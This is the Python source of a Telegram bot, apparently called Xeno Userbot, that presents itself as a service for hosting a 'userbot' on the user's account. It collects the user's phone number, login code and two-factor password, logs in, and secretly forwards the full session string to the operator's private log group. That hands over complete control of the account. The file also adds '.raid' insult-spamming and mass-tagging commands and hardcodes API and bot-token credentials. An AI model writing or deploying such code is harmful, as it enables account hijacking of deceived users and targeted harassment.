import os, asyncio, random
from pyrogram import Client, filters, errors
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"
def run_web(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- CONFIGURATION ---
API_ID = 24135757
API_HASH = "d3d5548fe0d98eb1fb793c2c37c9e5c8"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1002367805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

bot = Client("Useridgenbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {} # To store stop status for raids/tags

# Buttons
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝛒ᴅ𝛂𝛕𝛆 ❂ ", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝛖𝛒𝛒𝛔ʀ𝛕 ❂", url="https://t.me/+PKYLDIEYiTljMzMx")],
    [InlineKeyboardButton("❂ 𝐂𝛊𝛐ꜱ𝛆 ❂", callback_data="close")]
])

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(
        photo=START_IMG,
        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ** ✨\n\n"
                 f"ʜᴇʏ {m.from_user.mention},\n"
                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏꜱᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴꜱ** ᴋᴇ ʟɪʏᴇ ᴜꜱᴇʀʙᴏᴛ ʜᴏꜱᴛ ᴋᴀʀ ꜱᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
                 "📝 **ᴄᴏᴍᴍᴀɴᴅꜱ:**\n"
                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏꜱᴛ ʙᴏᴛ\n"
                 "» **/add** : ꜱᴛᴀʀᴛ ʜᴏꜱᴛɪɴɢ ᴘʀᴏᴄᴇꜱꜱ\n\n"
                 "ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴꜱ ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ."),
        reply_markup=main_buttons
    )

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ʏᴏᴜʀ ᴩʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ**\n(e.g., `+918200000009`):")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"session_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴩ ꜱᴇɴᴛ!** ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɪᴍ ᴛʜɪꜱ ꜰᴏʀᴍᴀᴛ: `1 2 3 4 5` (SPACE BY SPACE)")
        except Exception as e: await m.reply_text(f"❌ Error: {e}")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **ꜱᴇɴᴅ ʏᴏᴜʀ 2ꜰᴀ ᴩᴀꜱꜱᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ OTP Error: {e}")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ 2FA Error: {e}")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    user = m.from_user
    
    # --- LOG GROUP MESSAGE (Victor Style) ---
    log_msg = (
        f"🏁 **ɴᴇᴡ ᴜꜱᴇʀʙᴏᴛ ᴀᴅᴅᴇᴅ**\n\n"
        f"👤 **ᴜꜱᴇʀ:** {user.mention}\n"
        f"🆔 **ɪᴅ:** `{user.id}`\n"
        f"🔑 **ꜱᴇꜱꜱɪᴏɴ:** `{string}`\n\n"
        f"✨ **ᴊᴀ ᴘᴇʟ ꜱᴀʙᴋᴏ ᴏʀ ʜᴀᴀ xᴇɴᴏ ᴋᴏ ᴘᴀᴘᴀ ʙᴏʟ ᴋᴇ ᴊᴀɴᴀ 🥵**"
    )
    await c.send_message(LOG_GROUP, log_msg)
    
    # --- USER SUCCESS MESSAGE ---
    success_text = (
        f"✅ **ʟᴏɢɢᴇᴅ ɪɴ ᴀꜱ** — `{user.first_name}`\n\n"
        f"🔐 **ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ:**\n`{string}`\n\n"
        f"🚀 **ᴀᴜᴛᴏ-ʜᴏꜱᴛ ɴᴏᴡ...**\n\n"
        f"➤ ᴛᴏ ʙᴏᴛ ꜰʀᴏᴍ ʏᴏᴜʀ ɪᴅ ꜱᴇɴᴅ ᴛʜɪꜱ ᴄᴍᴅ `/remove`\n\n"
        f"⭕ **ʙᴏᴛ ꜱᴜᴄᴄᴇꜱꜰᴜʟʟʏ ᴀᴅᴅᴇᴅ**"
    )
    await m.reply_text(success_text)
    asyncio.create_task(start_userbot(string, uid))
    del user_data[uid]

async def start_userbot(string, uid):
    try:
        ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
        await ubot.start()
        active_tasks[uid] = False

        # .alive command
        @ubot.on_message(filters.command("alive", prefixes=".") & filters.me)
        async def alive_cmd(c, m):
            await m.edit("✨ **xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ ɪꜱ ᴀʟɪᴠᴇ**\n\n👤 **Owner:** Me\n📡 **Support:** @radhesupport")

        # .tagall command
        @ubot.on_message(filters.command("tagall", prefixes=".") & filters.me)
        async def tagall_cmd(c, m):
            active_tasks[uid] = True
            async for member in c.get_chat_members(m.chat.id):
                if not active_tasks[uid]: break
                if member.user.is_bot: continue
                await c.send_message(m.chat.id, f"{member.user.mention} ⚡ ᴊᴀɴᴜ ɪꜱ ʜᴇʀᴇ!")
                await asyncio.sleep(1.5)

        # .onetag command
        @ubot.on_message(filters.command("onetag", prefixes=".") & filters.me)
        async def onetag_cmd(c, m):
            async for member in c.get_chat_members(m.chat.id):
                if member.user.is_bot: continue
                await m.reply(f"👤 {member.user.mention} 👋")
                break

        # .raid command
        @ubot.on_message(filters.command("raid", prefixes=".") & filters.me)
        async def raid_cmd(c, m):
            if len(m.command) < 3: return await m.edit("Usage: `.raid 5 @user`")
            active_tasks[uid] = True
            count = int(m.command[1])
            target = m.command[2]
            raids = ["Abey Saale!", "Nikal yaha se...", "Teri @target...", "Beta papa se panga?"]
            for _ in range(count):
                if not active_tasks[uid]: break
                await c.send_message(m.chat.id, random.choice(raids).replace("@target", target))
                await asyncio.sleep(1)

        # .stop command
        @ubot.on_message(filters.command("stop", prefixes=".") & filters.me)
        async def stop_cmd(c, m):
            active_tasks[uid] = False
            await m.edit("✅ **All Processes Stopped!**")

    except Exception as e: print(f"Userbot Error: {e}")

if __name__ == "__main__":
    t = Thread(target=run_web)
    t.daemon = True
    t.start()
    bot.run()
